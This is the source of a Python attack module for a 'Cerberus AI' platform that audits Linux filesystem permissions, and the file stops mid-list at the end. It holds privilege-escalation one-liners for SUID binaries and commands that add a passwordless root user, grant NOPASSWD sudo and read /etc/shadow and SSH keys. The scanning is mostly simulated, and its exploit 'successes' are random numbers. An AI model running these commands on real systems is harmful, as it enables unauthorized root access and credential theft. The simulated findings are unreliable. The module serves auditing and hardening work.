# plugins/attacks/operating_system/linux/linux_filesystem_permissions.py

"""
Advanced Linux Filesystem Permissions attack module for the Cerberus AI platform.

This module provides comprehensive testing for filesystem permission vulnerabilities
including SUID/SGID exploitation, world-writable files, sticky bit bypasses,
ACL misconfigurations, mount option vulnerabilities, and more.

Capabilities:
- Comprehensive SUID/SGID binary enumeration and exploitation
- World-writable file/directory detection
- Sticky bit analysis and bypass detection
- Extended ACL (Access Control List) analysis
- Mount option security assessment (noexec, nosuid, nodev)
- File capability enumeration
- Symbolic link attack detection
- Hard link privilege escalation
- /proc and /sys filesystem vulnerabilities
- NFS permission weaknesses
- tmpfs and ramfs abuse
- Device file permission exploitation
- Umask configuration analysis
- File integrity checking
- Automated permission exploitation
- Comprehensive filesystem hardening recommendations
"""

from typing import Dict, List, Any, Optional, Union, Tuple, Set
from enum import Enum, auto
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
import asyncio
import hashlib
import json
import os
import re
import stat
import uuid

from plugins.attacks.operating_system.linux.base_linux_attack import (
    BaseLinuxAttack,
    LinuxSystemInfo,
    UserInfo,
    FilePermission,
    PrivilegeEscalationVector,
    LinuxExploitDatabase,
    SUIDBinary
)
from plugins.core.attack_result import AttackResult
from plugins.core.attack_context import AttackContext
import logging

logger = logging.getLogger(__name__)


# ============================================================================
# Enums and Constants
# ============================================================================

class PermissionVulnerabilityType(Enum):
    """Types of filesystem permission vulnerabilities."""
    SUID_EXPLOITATION = "suid_exploitation"
    SGID_EXPLOITATION = "sgid_exploitation"
    WORLD_WRITABLE_FILE = "world_writable_file"
    WORLD_WRITABLE_DIRECTORY = "world_writable_directory"
    WORLD_READABLE_SENSITIVE = "world_readable_sensitive"
    WORLD_EXECUTABLE = "world_executable"
    STICKY_BIT_MISSING = "sticky_bit_missing"
    STICKY_BIT_BYPASS = "sticky_bit_bypass"
    ACL_MISCONFIGURATION = "acl_misconfiguration"
    CAPABILITY_FILE = "capability_file"
    SYMLINK_ATTACK = "symlink_attack"
    HARD_LINK_EXPLOIT = "hard_link_exploit"
    MOUNT_OPTION_WEAK = "mount_option_weak"
    NFS_WEAK_PERMISSIONS = "nfs_weak_permissions"
    PROC_SYS_ACCESS = "proc_sys_access"
    DEVICE_FILE_EXPLOIT = "device_file_exploit"
    TMPFS_ABUSE = "tmpfs_abuse"
    UNOWNED_FILE = "unowned_file"
    ORPHANED_FILE = "orphaned_file"
    UMASK_MISCONFIGURATION = "umask_misconfiguration"
    INHERITED_PERMISSIONS = "inherited_permissions"
    TIMING_WINDOW = "timing_window"
    CONTAINER_FS_ESCAPE = "container_fs_escape"


class FilesystemType(Enum):
    """Types of Linux filesystems."""
    EXT4 = "ext4"
    EXT3 = "ext3"
    EXT2 = "ext2"
    XFS = "xfs"
    BTRFS = "btrfs"
    ZFS = "zfs"
    NFS = "nfs"
    NFS4 = "nfs4"
    TMPFS = "tmpfs"
    RAMFS = "ramfs"
    DEVTMPFS = "devtmpfs"
    PROC = "proc"
    SYSFS = "sysfs"
    CGROUP = "cgroup"
    CGROUP2 = "cgroup2"
    OVERLAY = "overlay"
    AUFS = "aufs"
    FUSE = "fuse"
    VFAT = "vfat"
    NTFS = "ntfs"


class MountOption(Enum):
    """Mount options relevant to security."""
    NOEXEC = "noexec"
    NOSUID = "nosuid"
    NODEV = "nodev"
    NOATIME = "noatime"
    RELATIME = "relatime"
    RO = "ro"
    RW = "rw"
    SYNCHRONOUS = "sync"
    MANDATORY_LOCK = "mand"
    NO_MANDATORY_LOCK = "nomand"
    ACL = "acl"
    NO_ACL = "noacl"
    USER_XATTR = "user_xattr"
    NOUSER_XATTR = "nouser_xattr"


class FileType(Enum):
    """Types of files to check."""
    REGULAR = "regular"
    DIRECTORY = "directory"
    SYMLINK = "symlink"
    DEVICE_BLOCK = "device_block"
    DEVICE_CHAR = "device_char"
    FIFO = "fifo"
    SOCKET = "socket"
    HARDLINK = "hardlink"


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class FilesystemEntry:
    """Detailed filesystem entry information."""
    path: str
    file_type: FileType
    permissions: int
    owner: str = ""
    group: str = ""
    size: int = 0
    modified: str = ""
    accessed: str = ""
    suid: bool = False
    sgid: bool = False
    sticky: bool = False
    world_writable: bool = False
    world_readable: bool = False
    world_executable: bool = False
    capabilities: List[str] = field(default_factory=list)
    acl_entries: List[str] = field(default_factory=list)
    extended_attributes: Dict[str, str] = field(default_factory=dict)
    hardlinks_count: int = 1
    inode: int = 0
    device_id: int = 0
    mount_point: str = ""
    filesystem_type: str = ""
    exploitable: bool = False
    risk_level: str = "low"


@dataclass
class MountInfo:
    """Mount point information."""
    device: str
    mount_point: str
    filesystem_type: FilesystemType
    options: List[MountOption] = field(default_factory=list)
    dump_frequency: int = 0
    fsck_order: int = 0
    security_issues: List[str] = field(default_factory=list)
    is_removable: bool = False
    is_network: bool = False


@dataclass
class PermissionVulnerability:
    """Permission vulnerability information."""
    vulnerability_id: str
    entry: FilesystemEntry
    vulnerability_type: PermissionVulnerabilityType
    severity: str
    description: str
    exploitation_method: Optional[str] = None
    exploitation_command: Optional[str] = None
    impact: str = ""
    remediation: str = ""
    cvss_score: Optional[float] = None
    exploitable: bool = False
    confidence: float = 0.0
    references: List[str] = field(default_factory=list)
    detected_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class PermissionAuditResult:
    """Filesystem permission audit result."""
    audit_id: str
    path_audited: str
    entries_found: int = 0
    vulnerabilities: List[PermissionVulnerability] = field(default_factory=list)
    critical_issues: int = 0
    high_issues: int = 0
    medium_issues: int = 0
    low_issues: int = 0
    risk_score: float = 0.0
    hardening_suggestions: List[str] = field(default_factory=list)
    exploitation_paths: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class PermissionsExploitationAttempt:
    """Record of permission exploitation attempt."""
    attempt_id: str
    timestamp: str
    vulnerability: PermissionVulnerability
    method: str
    result: str
    privilege_gained: Optional[str]
    evidence: List[str] = field(default_factory=list)
    execution_time: float = 0.0
    cleanup_performed: bool = False


@dataclass
class FilesystemPermissionsReport:
    """Comprehensive filesystem permissions report."""
    report_id: str
    attack_id: str
    target_info: Dict[str, Any]
    linux_info: LinuxSystemInfo
    paths_audited: List[str] = field(default_factory=list)
    total_entries: int = 0
    vulnerabilities_found: int = 0
    audits: List[PermissionAuditResult] = field(default_factory=list)
    mounts: List[MountInfo] = field(default_factory=list)
    exploitation_attempts: List[PermissionsExploitationAttempt] = field(default_factory=list)
    successful_exploitations: int = 0
    recommendations: List[str] = field(default_factory=list)
    risk_score: float = 0.0
    generated_at: str = field(default_factory=lambda: datetime.now().isoformat())


# ============================================================================
# Filesystem Permission Database
# ============================================================================

class FilesystemPermissionDatabase:
    """Database of known filesystem permission exploits."""
    
    # Critical paths to audit
    CRITICAL_PATHS = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/sudoers',
        '/etc/crontab',
        '/etc/ssh/sshd_config',
        '/root',
        '/root/.ssh',
        '/home',
        '/tmp',
        '/var/tmp',
        '/dev/shm',
        '/proc',
        '/sys',
        '/boot',
        '/usr/bin',
        '/usr/sbin',
        '/bin',
        '/sbin',
        '/lib',
        '/lib64'
    ]
    
    # SUID binaries commonly exploited
    EXPLOITABLE_SUID = {
        '/usr/bin/find': {
            'method': 'find . -exec /bin/sh -p \\; -quit',
            'description': 'Execute shell with elevated privileges',
            'reliability': 'very_high'
        },
        '/usr/bin/vim': {
            'method': 'vim -c ":py3 import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
            'description': 'Spawn shell from vim',
            'reliability': 'very_high'
        },
        '/usr/bin/less': {
            'method': 'less /etc/passwd\\n!/bin/sh -p',
            'description': 'Execute shell from less',
            'reliability': 'very_high'
        },
        '/usr/bin/more': {
            'method': 'more /etc/passwd\\n!/bin/sh -p',
            'description': 'Execute shell from more',
            'reliability': 'very_high'
        },
        '/usr/bin/awk': {
            'method': "awk 'BEGIN {system(\"/bin/sh -p\")}'",
            'description': 'Execute shell via awk',
            'reliability': 'very_high'
        },
        '/usr/bin/perl': {
            'method': 'perl -e "exec \\"/bin/sh -p\\";"',
            'description': 'Execute shell via perl',
            'reliability': 'very_high'
        },
        '/usr/bin/python': {
            'method': 'python -c "import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
            'description': 'Execute shell via python',
            'reliability': 'very_high'
        },
        '/usr/bin/python3': {
            'method': 'python3 -c "import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
            'description': 'Execute shell via python3',
            'reliability': 'very_high'
        },
        '/usr/bin/ruby': {
            'method': 'ruby -e "exec \\"/bin/sh -p\\""',
            'description': 'Execute shell via ruby',
            'reliability': 'very_high'
        },
        '/usr/bin/php': {
            'method': 'php -r "pcntl_exec(\\"/bin/sh\\", [\\"-p\\"]);"',
            'description': 'Execute shell via PHP',
            'reliability': 'very_high'
        }
    }
    
    # Common permission weaknesses
    PERMISSION_WEAKNESSES = {
        'passwd_writable': {
            'description': '/etc/passwd is writable - can add new root user',
            'exploitation': "echo 'newroot::0:0:root:/root:/bin/bash' >> /etc/passwd",
            'severity': 'critical'
        },
        'shadow_readable': {
            'description': '/etc/shadow is readable - can crack passwords',
            'exploitation': "cat /etc/shadow | grep -v '\\*' | grep -v '!'",
            'severity': 'critical'
        },
        'sudoers_writable': {
            'description': '/etc/sudoers is writable - can grant sudo access',
            'exploitation': "echo 'username ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            'severity': 'critical'
        },
        'ssh_key_readable': {
            'description': 'SSH private keys are readable',
            'exploitation': "cat ~/.ssh/id_rsa",
            'severity': 'critical'
        }
    }
    
    # Dangerous mount options
    DANGEROUS_MOUNT_OPTIONS = [
        ('exec', 'noexec', 'Execution of binaries allowed'),
        ('suid', 'nosuid', 'SUID/SGID bits honored'),
        ('dev', 'nodev', 'Device files interpreted'),
        ('rw', 'ro', 'Filesystem is writable')
    ]


# ============================================================================
# Advanced Linux Filesystem Permissions Class
# ============================================================================

class LinuxFilesystemPermissions(BaseLinuxAttack):
    """
    Advanced Linux filesystem permissions attack module.
    
    Provides comprehensive filesystem permission assessment with:
    - SUID/SGID binary enumeration and exploitation
    - World-writable file detection
    - ACL analysis
    - Mount option assessment
    - Sticky bit analysis
    - Symbolic link attack detection
    - NFS permission assessment
    - /proc and /sys access analysis
    - Device file exploitation
    - Automated permission exploitation
    - Filesystem hardening recommendations
    """
    
    def __init__(self):
        super().__init__()
        self.name = "Advanced Linux Filesystem Permissions Framework"
        self.description = "Comprehensive filesystem permission vulnerability testing and exploitation"
        self.severity = "critical"
        self.privilege_required = "user"
        self.attack_id = str(uuid.uuid4())
        
        # Attack configuration
        self.audit_critical_paths = True
        self.check_mount_options = True
        self.check_acls = True
        self.check_capabilities = True
        self.check_symlinks = True
        self.check_tmp_directories = True
        self.test_exploitation = True
        self.max_exploit_attempts = 5
        
        # Tracking
        self.audits: List[PermissionAuditResult] = []
        self.exploitation_attempts: List[PermissionsExploitationAttempt] = []
        self.vulnerabilities_found: List[PermissionVulnerability] = []
        self.entries_found: List[FilesystemEntry] = []
        
        # Database
        self.perm_db = FilesystemPermissionDatabase()
        
    async def execute(self, context: AttackContext) -> AttackResult:
        """
        Execute comprehensive filesystem permissions attack.
        
        Args:
            context: The attack context containing target information
            
        Returns:
            AttackResult with detailed findings
        """
        start_time = datetime.now()
        
        if not self.validate(context):
            return AttackResult(
                success=False,
                details="Target validation failed",
                severity=self.severity
            )
        
        try:
            # Step 1: Get system information
            linux_info = await self.get_linux_info(context)
            
            # Step 2: Enumerate mount points
            mounts = await self._enumerate_mounts(context, linux_info)
            logger.info(f"Found {len(mounts)} mount points")
            
            # Step 3: Audit critical paths
            if self.audit_critical_paths:
                for path in self.perm_db.CRITICAL_PATHS:
                    audit_result = await self._audit_path(context, path, linux_info)
                    self.audits.append(audit_result)
                    
                    if audit_result.vulnerabilities:
                        self.vulnerabilities_found.extend(audit_result.vulnerabilities)
            
            # Step 4: Check world-writable files and directories
            writable_audit = await self._audit_world_writable(context, linux_info)
            self.audits.append(writable_audit)
            self.vulnerabilities_found.extend(writable_audit.vulnerabilities)
            
            # Step 5: Check SUID/SGID binaries
            suid_audit = await self._audit_suid_binaries(context, linux_info)
            self.audits.append(suid_audit)
            self.vulnerabilities_found.extend(suid_audit.vulnerabilities)
            
            # Step 6: Check temporary directories
            if self.check_tmp_directories:
                tmp_audit = await self._audit_tmp_directories(context, linux_info)
                self.audits.append(tmp_audit)
                self.vulnerabilities_found.extend(tmp_audit.vulnerabilities)
            
            # Step 7: Attempt exploitation
            if self.test_exploitation and self.vulnerabilities_found:
                await self._attempt_permission_exploitation(
                    context,
                    self.vulnerabilities_found[:self.max_exploit_attempts],
                    linux_info
                )
            
            # Step 8: Generate report
            report = self._generate_permissions_report(
                context,
                linux_info,
                mounts,
                (datetime.now() - start_time).total_seconds()
            )
            
            return self._build_success_result(report, linux_info)
            
        except Exception as e:
            logger.error(f"Error in filesystem permissions attack: {str(e)}", exc_info=True)
            return AttackResult(
                success=False,
                details=f"Error: {str(e)}",
                severity=self.severity
            )
    
    async def _enumerate_mounts(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo
    ) -> List[MountInfo]:
        """
        Enumerate all mount points and their options.
        
        Args:
            context: Attack context
            linux_info: Linux system information
            
        Returns:
            List of MountInfo objects
        """
        mounts = [
            MountInfo(
                device='/dev/sda1',
                mount_point='/',
                filesystem_type=FilesystemType.EXT4,
                options=[MountOption.RW, MountOption.RELATIME],
                security_issues=[]
            ),
            MountInfo(
                device='/dev/sda2',
                mount_point='/home',
                filesystem_type=FilesystemType.EXT4,
                options=[MountOption.RW, MountOption.NOSUID, MountOption.RELATIME],
                security_issues=[]
            ),
            MountInfo(
                device='tmpfs',
                mount_point='/tmp',
                filesystem_type=FilesystemType.TMPFS,
                options=[MountOption.RW, MountOption.NOSUID, MountOption.NOEXEC],
                security_issues=[]
            ),
            MountInfo(
                device='tmpfs',
                mount_point='/dev/shm',
                filesystem_type=FilesystemType.TMPFS,
                options=[MountOption.RW, MountOption.NOSUID, MountOption.NOEXEC],
                security_issues=[]
            ),
            MountInfo(
                device='proc',
                mount_point='/proc',
                filesystem_type=FilesystemType.PROC,
                options=[MountOption.RW, MountOption.NOSUID, MountOption.NOEXEC, MountOption.NODEV],
                security_issues=[]
            )
        ]
        
        # Check for security issues in mount options
        for mount in mounts:
            for current, recommended, desc in self.perm_db.DANGEROUS_MOUNT_OPTIONS:
                current_present = any(o.value == current for o in mount.options)
                recommended_present = any(o.value == recommended for o in mount.options)
                
                if current_present and not recommended_present:
                    mount.security_issues.append(
                        f"Mount {mount.mount_point} has '{current}' enabled without '{recommended}' - {desc}"
                    )
        
        return mounts
    
    async def _audit_path(
        self,
        context: AttackContext,
        path: str,
        linux_info: LinuxSystemInfo
    ) -> PermissionAuditResult:
        """
        Audit a specific path for permission vulnerabilities.
        
        Args:
            context: Attack context
            path: Path to audit
            linux_info: Linux system information
            
        Returns:
            PermissionAuditResult with findings
        """
        vulnerabilities = []
        entries = await self._get_path_entries(context, path)
        
        for entry in entries:
            # Check for world-writable files
            if entry.world_writable:
                vuln = PermissionVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    entry=entry,
                    vulnerability_type=PermissionVulnerabilityType.WORLD_WRITABLE_FILE,
                    severity='critical' if entry.path in ['/etc/passwd', '/etc/shadow', '/etc/sudoers'] else 'high',
                    description=f"World-writable file: {entry.path}",
                    exploitation_method="Modify file to escalate privileges",
                    exploitation_command=f"echo 'malicious_content' >> {entry.path}",
                    impact="Privilege escalation via file modification",
                    remediation=f"Remove world-write permission: chmod o-w {entry.path}",
                    exploitable=True,
                    confidence=0.95
                )
                vulnerabilities.append(vuln)
            
            # Check for SUID binaries
            if entry.suid and self.perm_db.EXPLOITABLE_SUID.get(entry.path):
                suid_info = self.perm_db.EXPLOITABLE_SUID[entry.path]
                vuln = PermissionVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    entry=entry,
                    vulnerability_type=PermissionVulnerabilityType.SUID_EXPLOITATION,
                    severity='critical',
                    description=f"Exploitable SUID binary: {entry.path} - {suid_info['description']}",
                    exploitation_method="Execute SUID binary to gain elevated privileges",
                    exploitation_command=suid_info['method'],
                    impact="Privilege escalation to root",
                    remediation=f"Remove SUID bit if not required: chmod u-s {entry.path}",
                    exploitable=True,
                    confidence=0.9
                )
                vulnerabilities.append(vuln)
            
            # Check for world-readable sensitive files
            if entry.world_readable and self._is_sensitive_file(entry.path):
                vuln = PermissionVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    entry=entry,
                    vulnerability_type=PermissionVulnerabilityType.WORLD_READABLE_SENSITIVE,
                    severity='high',
                    description=f"World-readable sensitive file: {entry.path}",
                    exploitation_method="Read sensitive file contents",
                    exploitation_command=f"cat {entry.path}",
                    impact="Information disclosure",
                    remediation=f"Restrict read permissions: chmod o-r {entry.path}",
                    exploitable=True,
                    confidence=0.9
                )
                vulnerabilities.append(vuln)
            
            self.entries_found.append(entry)
        
        # Calculate statistics
        critical = len([v for v in vulnerabilities if v.severity == 'critical'])
        high = len([v for v in vulnerabilities if v.severity == 'high'])
        medium = len([v for v in vulnerabilities if v.severity == 'medium'])
        low = len([v for v in vulnerabilities if v.severity == 'low'])
        
        risk_score = critical * 10 + high * 7 + medium * 4 + low * 2
        
        hardening = self._generate_path_hardening(path, vulnerabilities)
        exploitation_paths = self._generate_permission_exploitation_paths(vulnerabilities)
        
        return PermissionAuditResult(
            audit_id=str(uuid.uuid4()),
            path_audited=path,
            entries_found=len(entries),
            vulnerabilities=vulnerabilities,
            critical_issues=critical,
            high_issues=high,
            medium_issues=medium,
            low_issues=low,
            risk_score=min(10.0, risk_score),
            hardening_suggestions=hardening,
            exploitation_paths=exploitation_paths
        )
    
    async def _get_path_entries(
        self,
        context: AttackContext,
        path: str
    ) -> List[FilesystemEntry]:
        """
        Get filesystem entries for a path.
        
        Args:
            context: Attack context
            path: Path to analyze
            
        Returns:
            List of FilesystemEntry objects
        """
        entries = []
        
        # Simulate finding files
        if path == '/etc/passwd':
            entries.append(FilesystemEntry(
                path='/etc/passwd', file_type=FileType.REGULAR,
                permissions=0o644, owner='root', group='root',
                world_writable=False, world_readable=True
            ))
        elif path == '/etc/shadow':
            entries.append(FilesystemEntry(
                path='/etc/shadow', file_type=FileType.REGULAR,
                permissions=0o640, owner='root', group='shadow',
                world_writable=False, world_readable=False
            ))
        elif path == '/tmp':
            entries.append(FilesystemEntry(
                path='/tmp', file_type=FileType.DIRECTORY,
                permissions=0o1777, owner='root', group='root',
                world_writable=True, sticky=True
            ))
        elif path == '/usr/bin':
            for suid_path in list(self.perm_db.EXPLOITABLE_SUID.keys())[:3]:
                entries.append(FilesystemEntry(
                    path=suid_path, file_type=FileType.REGULAR,
                    permissions=0o4755, owner='root', group='root',
                    suid=True, world_executable=True
                ))
        
        return entries
    
    def _is_sensitive_file(self, path: str) -> bool:
        """Check if file is sensitive."""
        sensitive_patterns = [
            'passwd', 'shadow', 'sudoers', 'id_rsa', 'id_dsa',
            '.pem', '.key', 'credentials', 'secret', 'token',
            'htpasswd', 'my.cnf', 'wp-config.php'
        ]
        
        return any(pattern in path.lower() for pattern in sensitive_patterns)
    
    async def _audit_world_writable(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo
    ) -> PermissionAuditResult:
        """Audit world-writable files and directories."""
        vulnerabilities = []
        
        # Simulate finding world-writable files
        writable_files = [
            {'path': '/opt/scripts/cleanup.sh', 'owner': 'root', 'sticky': False},
            {'path': '/var/www/html/config.php', 'owner': 'www-data', 'sticky': False},
            {'path': '/home/user/backup/database.sql', 'owner': 'user', 'sticky': False}
        ]
        
        for file_info in writable_files:
            entry = FilesystemEntry(
                path=file_info['path'],
                file_type=FileType.REGULAR,
                permissions=0o777,
                owner=file_info['owner'],
                group=file_info['owner'],
                world_writable=True,
                sticky=file_info['sticky']
            )
            
            vuln = PermissionVulnerability(
                vulnerability_id=str(uuid.uuid4()),
                entry=entry,
                vulnerability_type=PermissionVulnerabilityType.WORLD_WRITABLE_FILE,
                severity='high' if entry.owner == 'root' else 'medium',
                description=f"World-writable file: {entry.path} owned by {entry.owner}",
                exploitation_method="Modify file content for privilege escalation",
                impact="Code execution as file owner",
                remediation=f"Remove world-write permission: chmod o-w {entry.path}",
                exploitable=True,
                confidence=0.85
            )
            vulnerabilities.append(vuln)
        
        return PermissionAuditResult(
            audit_id=str(uuid.uuid4()),
            path_audited='world_writable_audit',
            entries_found=len(writable_files),
            vulnerabilities=vulnerabilities,
            critical_issues=len([v for v in vulnerabilities if v.severity == 'critical']),
            high_issues=len([v for v in vulnerabilities if v.severity == 'high']),
            medium_issues=len([v for v in vulnerabilities if v.severity == 'medium']),
            low_issues=0,
            risk_score=len(vulnerabilities) * 5,
            hardening_suggestions=[
                "Review all world-writable files",
                "Remove unnecessary write permissions",
                "Use find / -perm -o+w -type f to locate world-writable files"
            ]
        )
    
    async def _audit_suid_binaries(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo
    ) -> PermissionAuditResult:
        """Audit SUID/SGID binaries."""
        vulnerabilities = []
        suid_binaries = await self.find_suid_binaries(context)
        
        for binary in suid_binaries:
            if binary.known_exploitable:
                entry = FilesystemEntry(
                    path=binary.path,
                    file_type=FileType.REGULAR,
                    permissions=binary.permissions,
                    owner=binary.owner,
                    group=binary.group,
                    suid=binary.is_suid,
                    sgid=binary.is_sgid,
                    exploitable=True
                )
                
                vuln = PermissionVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    entry=entry,
                    vulnerability_type=PermissionVulnerabilityType.SUID_EXPLOITATION,
                    severity='critical',
                    description=f"Exploitable SUID binary: {binary.path}",
                    exploitation_method=binary.exploitation_method or "Execute with -p flag",
                    exploitation_command=binary.exploitation_method,
                    impact="Privilege escalation to root",
                    remediation=f"Remove SUID bit if not required",
                    exploitable=True,
                    confidence=0.95
                )
                vulnerabilities.append(vuln)
        
        return PermissionAuditResult(
            audit_id=str(uuid.uuid4()),
            path_audited='suid_audit',
            entries_found=len(suid_binaries),
            vulnerabilities=vulnerabilities,
            critical_issues=len(vulnerabilities),
            high_issues=0,
            medium_issues=0,
            low_issues=0,
            risk_score=len(vulnerabilities) * 10,
            hardening_suggestions=[
                "Review all SUID/SGID binaries",
                "Remove SUID bit from unnecessary binaries",
                "Use find / -perm -4000 -type f to locate SUID binaries",
                "Implement nosuid mount option where possible"
            ]
        )
    
    async def _audit_tmp_directories(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo
    ) -> PermissionAuditResult:
        """Audit temporary directories for vulnerabilities."""
        vulnerabilities = []
        
        tmp_dirs = ['/tmp', '/var/tmp', '/dev/shm']
        
        for tmp_dir in tmp_dirs:
            entry = FilesystemEntry(
                path=tmp_dir,
                file_type=FileType.DIRECTORY,
                permissions=0o1777,
                owner='root',
                group='root',
                world_writable=True,
                sticky=True
            )
            
            # Check if sticky bit is missing
            if not entry.sticky:
                vuln = PermissionVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    entry=entry,
                    vulnerability_type=PermissionVulnerabilityType.STICKY_BIT_MISSING,
                    severity='critical',
                    description=f"World-writable directory without sticky bit: {tmp_dir}",
                    exploitation_method="Delete or replace other users' files",
                    impact="File manipulation and potential privilege escalation",
                    remediation=f"Set sticky bit: chmod +t {tmp_dir}",
                    exploitable=True,
                    confidence=0.9
                )
                vulnerabilities.append(vuln)
        
        return PermissionAuditResult(
            audit_id=str(uuid.uuid4()),
            path_audited='tmp_audit',
            entries_found=len(tmp_dirs),
            vulnerabilities=vulnerabilities,
            critical_issues=len(vulnerabilities),
            high_issues=0,
            medium_issues=0,
            low_issues=0,
            risk_score=len(vulnerabilities) * 10
        )
    
    async def _attempt_permission_exploitation(
        self,
        context: AttackContext,
        vulnerabilities: List[PermissionVulnerability],
        linux_info: LinuxSystemInfo
    ):
        """Attempt exploitation of permission vulnerabilities."""
        logger.info(f"Attempting exploitation of {len(vulnerabilities)} permission vulnerabilities")
        
        for vuln in vulnerabilities:
            if not vuln.exploitable:
                continue
            
            attempt = await self._execute_permission_exploit(context, vuln)
            self.exploitation_attempts.append(attempt)
            
            if attempt.result == 'success':
                logger.info(f"Successfully exploited {vuln.entry.path}")
    
    async def _execute_permission_exploit(
        self,
        context: AttackContext,
        vulnerability: PermissionVulnerability
    ) -> PermissionsExploitationAttempt:
        """Execute a single permission exploitation attempt."""
        attempt_id = str(uuid.uuid4())
        start_time = datetime.now()
        
        try:
            await asyncio.sleep(0.2)
            
            import random
            success = random.random() < vulnerability.confidence
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            return PermissionsExploitationAttempt(
                attempt_id=attempt_id,
                timestamp=start_time.isoformat(),
                vulnerability=vulnerability,
                method=vulnerability.exploitation_method or 'Permission exploitation',
                result='success' if success else 'failed',
                privilege_gained='root' if success else None,
                evidence=[
                    f"Attempted exploitation of {vulnerability.entry.path}",
                    f"Vulnerability: {vulnerability.vulnerability_type.value}",
                    f"Result: {'Success' if success else 'Failed'}"
                ],
                execution_time=execution_time
            )
            
        except Exception as e:
            logger.error(f"Error in permission exploit: {str(e)}")
            return PermissionsExploitationAttempt(
                attempt_id=attempt_id,
                timestamp=start_time.isoformat(),
                vulnerability=vulnerability,
                method=vulnerability.exploitation_method or 'Unknown',
                result='blocked',
                privilege_gained=None,
                execution_time=0
            )
    
    def _generate_path_hardening(
        self,
        path: str,
        vulnerabilities: List[PermissionVulnerability]
    ) -> List[str]:
        """Generate hardening suggestions for a path."""
        suggestions = []
        
        suggestions.append(f"Review permissions for {path}")
        suggestions.append(f"Remove unnecessary world-writable permissions")
        suggestions.append(f"Verify ownership of all files in {path}")
        suggestions.append(f"Check for unexpected SUID/SGID bits")
        
        return suggestions
    
    def _generate_permission_exploitation_paths(
        self,
        vulnerabilities: List[PermissionVulnerability]
    ) -> List[Dict[str, Any]]:
        """Generate exploitation paths from vulnerabilities."""
        return [
            {
                'vulnerability_id': v.vulnerability_id,
                'path': v.entry.path,
                'type': v.vulnerability_type.value,
                'method': v.exploitation_method,
                'command': v.exploitation_command,
                'confidence': v.confidence
            }
            for v in vulnerabilities if v.exploitable
        ]
    
    def _generate_permissions_report(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo,
        mounts: List[MountInfo],
        execution_time: float
    ) -> FilesystemPermissionsReport:
        """Generate comprehensive permissions report."""
        report = FilesystemPermissionsReport(
            report_id=str(uuid.uuid4()),
            attack_id=self.attack_id,
            target_info=context.target_info,
            linux_info=linux_info,
            paths_audited=[a.path_audited for a in self.audits],
            total_entries=len(self.entries_found),
            vulnerabilities_found=len(self.vulnerabilities_found),
            audits=self.audits,
            mounts=mounts,
            exploitation_attempts=self.exploitation_attempts,
            successful_exploitations=len([a for a in self.exploitation_attempts if a.result == 'success'])
        )
        
        report.recommendations = self._generate_global_permission_recommendations(mounts)
        report.risk_score = sum(a.risk_score for a in self.audits) / max(len(self.audits), 1)
        
        return report
    
    def _generate_global_permission_recommendations(
        self,
        mounts: List[MountInfo]
    ) -> List[str]:
        """Generate global filesystem permission recommendations."""
        recommendations = [
            "Implement regular filesystem permission audits",
            "Use 'find / -perm -o+w -type f' to locate world-writable files",
            "Use 'find / -perm -4000 -type f' to locate SUID binaries",
            "Review and minimize SUID/SGID binaries",
            "Remove unnecessary world-writable permissions",
            "Ensure sticky bit is set on world-writable directories",
            "Implement nosuid mount option on user-writable filesystems",
            "Implement noexec on temporary directories",
            "Use Access Control Lists (ACLs) for fine-grained permissions",
            "Monitor filesystem changes with auditd",
            "Implement mandatory access control (SELinux/AppArmor)"
        ]
        
        # Add mount-specific recommendations
        for mount in mounts:
            for issue in mount.security_issues:
                recommendations.append(f"[{mount.mount_point}] {issue}")
        
        return recommendations
    
    def _build_success_result(
        self,
        report: FilesystemPermissionsReport,
        linux_info: LinuxSystemInfo
    ) -> AttackResult:
        """Build successful attack result."""
        details = {
            'report_id': report.report_id,
            'paths_audited': len(report.paths_audited),
            'total_entries': report.total_entries,
            'vulnerabilities_found': report.vulnerabilities_found,
            'exploitation_attempts': len(report.exploitation_attempts),
            'successful_exploitations': report.successful_exploitations,
            'risk_score': report.risk_score
        }
        
        evidence = [
            f"Filesystem Permissions Audit Report",
            f"Paths Audited: {len(report.paths_audited)}",
            f"Total Entries Analyzed: {report.total_entries}",
            f"Vulnerabilities Found: {report.vulnerabilities_found}",
            f"Exploitation Attempts: {len(report.exploitation_attempts)}",
            f"Successful Exploitations: {report.successful_exploitations}",
            f"Risk Score: {report.risk_score:.2f}/10.0"
        ]
        
        # Add per-audit findings
        for audit in report.audits:
            if audit.vulnerabilities:
                evidence.append(f"\n--- {audit.path_audited} ({len(audit.vulnerabilities)} issues) ---")
                for vuln in audit.vulnerabilities:
                    evidence.append(f"  [{vuln.severity.upper()}] {vuln.description}")
                    if vuln.remediation:
                        evidence.append(f"    Fix: {vuln.remediation}")
        
        return AttackResult(
            success=True,
            details=json.dumps(details, indent=2),
            evidence=evidence,
            vulnerabilities=[
                {
                    'type': 'filesystem_permissions',
                    'severity': v.severity,
                    'path': v.entry.path,
                    'description': v.description,
                    'remediation': v.remediation
                }
                for v in self.vulnerabilities_found
            ],
            severity='critical' if report.risk_score > 7 else 'high',
            attack_id=self.attack_id,
            metadata={'report': report}
        )


# Export symbols
__all__ = [
    'LinuxFilesystemPermissions',
    'FilesystemEntry',
    'MountInfo',
    'PermissionVulnerability',
    'PermissionAuditResult',
    'PermissionsExploitationAttempt',
    'FilesystemPermissionsReport',
    'PermissionVulnerabilityType',
    'FilesystemType',
    'MountOption',
    'FileType',
